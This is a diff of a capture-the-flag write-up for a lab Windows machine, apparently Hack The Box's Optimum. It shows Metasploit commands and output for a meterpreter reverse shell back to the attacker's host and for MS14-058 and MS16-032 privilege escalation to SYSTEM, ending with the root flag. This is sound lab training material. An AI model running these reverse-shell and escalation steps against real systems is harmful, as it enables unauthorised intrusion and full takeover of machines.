@@ -609,13 +609,157 @@ dir
 23/01/2021  04:59 ��    <DIR>          .
 23/01/2021  04:59 ��    <DIR>          ..
 18/03/2017  02:11 ��           760.320 hfs.exe
+18/03/2017  02:13 ��                32 user.txt.txt
 23/01/2021  05:04 ��             7.168 meterpreter.exe
                2 File(s)        767.488 bytes
                2 Dir(s)  31.897.223.168 bytes free
 ```
-We got our payload in successfully! However, the original flag is gone. Some guy must have deleted it. Let's just ignore that for now.
+We got our payload in successfully!
 
-Time to run another listener, and execute the `meterpreter.exe` payload we inserted.
+Time to run another listener, before executing the `meterpreter.exe` payload we inserted. We open another terminal for msfconsole.
+```
+hippoeug@kali:~$ msfconsole
+...
+msf5 > use multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > show options
+...
+msf5 exploit(multi/handler) > set lhost 10.10.x.x
+lhost => 10.10.x.x
+msf5 exploit(multi/handler) > set lport 4545
+lport => 4545
+```
+Let's run it with `exploit`.
+
+We go back to our previous terminal with the regular shell to execute our payload.
+```
+C:\Users\kostas\Desktop>meterpreter.exe
+meterpreter.exe
 ```
 
+Let's go back to the new terminal to see if we get a meterpreter reverse shell connection.
+```
+msf5 exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 10.10.x.x:4545 
+[*] Sending stage (201283 bytes) to 10.10.10.8
+[*] Meterpreter session 1 opened (10.10.14.15:4545 -> 10.10.10.8:49204) at 2021-01-17 14:22:40 +0800
+
+meterpreter > background
+msf5 > sessions 
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information               Connection
+  --  ----  ----                     -----------               ----------
+  1         meterpreter x64/windows  OPTIMUM\kostas @ OPTIMUM  10.10.14.15:4545 -> 10.10.10.8:49204 (10.10.10.8)
+```
+Indeed we did!
+
+First step, `getsystem` lol.
+```
+meterpreter > getsystem
+[-] priv_elevate_getsystem: Operation failed: The environment is incorrect. The following was attempted:
+[-] Named Pipe Impersonation (In Memory/Admin)
+[-] Named Pipe Impersonation (Dropper/Admin)
+[-] Token Duplication (In Memory/Admin)
+```
+Nope.
+
+Let's try the `MS14_058` exploit first.
+```
+msf5 > use exploit/windows/local/ms14_058_track_popup_menu
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > show targets
+...
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > set target 1
+target => 1
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > show options
+...
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > set lhost 10.10.x.x
+lhost => 10.10.x.x
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > set lport 4646
+lport => 4646
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > set session 1
+session => 1
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > run
+
+[*] Started reverse TCP handler on 10.10.14.15:4646 
+[-] Exploit aborted due to failure: not-vulnerable: Exploit not available on this system.
+[*] Exploit completed, but no session was created.
+```
+Hmm, this did not work.
+
+Let's try the alternative `MS16_032`.
+```
+msf5 > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > show targets
+...
+msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set target 1
+target => 1
+msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > show options
+...
+msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set lhost 10.10.x.x
+lhost => 10.10.x.x
+msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set lport 4646
+lport => 4646
+msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set session 1
+session => 1
+msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run
+
+[*] Started reverse TCP handler on 10.10.14.15:4646 
+[+] Compressed size: 1016
+[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
+[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\uenODdmaCwwNK.ps1...
+[*] Compressing script contents...
+[+] Compressed size: 3600
+[*] Executing exploit script...
+         __ __ ___ ___   ___     ___ ___ ___ 
+        |  V  |  _|_  | |  _|___|   |_  |_  |
+        |     |_  |_| |_| . |___| | |_  |  _|
+        |_|_|_|___|_____|___|   |___|___|___|
+                                            
+                       [by b33f -> @FuzzySec]
+
+[?] Operating system core count: 2
+[>] Duplicating CreateProcessWithLogonW handle
+[?] Done, using thread handle: 1176
+
+[*] Sniffing out privileged impersonation token..
+
+[?] Thread belongs to: svchost
+[+] Thread suspended
+[>] Wiping current impersonation token
+[>] Building SYSTEM impersonation token
+[?] Success, open SYSTEM token handle: 1232
+[+] Resuming thread..
+
+[*] Sniffing out SYSTEM shell..
+
+[>] Duplicating SYSTEM token
+[>] Starting token race
+[>] Starting process race
+[!] Holy handle leak Batman, we have a SYSTEM shell!!
+
+TJn8TusTEgQYWSVvMHKkkWIl2Ff4BM8N
+[+] Executed on target machine.
+[*] Sending stage (176195 bytes) to 10.10.10.8
+[*] Meterpreter session 2 opened (10.10.14.15:4646 -> 10.10.10.8:49205) at 2021-01-17 14:27:43 +0800
+[+] Deleted C:\Users\kostas\AppData\Local\Temp\uenODdmaCwwNK.ps1
+...
+meterpreter > dir
+Listing: C:\Users\Administrator\Desktop
+=======================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  282   fil   2017-03-18 19:52:56 +0800  desktop.ini
+100444/r--r--r--  32    fil   2017-03-18 20:13:57 +0800  root.txt
+
+meterpreter > cat root.txt
+51ed1b36553c8461f4552c2e92b3eeed
 ```
